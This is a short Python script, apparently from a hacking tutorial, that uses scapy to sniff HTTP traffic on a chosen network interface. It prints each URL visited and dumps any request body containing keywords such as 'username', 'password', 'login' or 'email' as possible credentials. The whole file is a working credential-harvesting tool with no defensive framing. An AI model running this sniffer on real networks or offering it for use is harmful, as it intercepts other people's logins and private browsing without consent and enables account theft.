from struct import pack
import scapy.all as scapy
from scapy.layers import http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Network interface")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify a interface, use --help for more info")
    return options



def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)
    
def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] Url visited: {}{}".format(packet[http.HTTPRequest].Host.decode(),packet[http.HTTPRequest].Path.decode()))
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "uname", "name", "pass", "password", "login", "email", "e-mail", "e_mail"]
            for keyword in keywords:
                if keyword.encode() in load:
                    print("[*] Possible username and password: {}".format(packet[scapy.Raw].load.decode()))
                    break

options = get_arguments()
sniff(options.interface)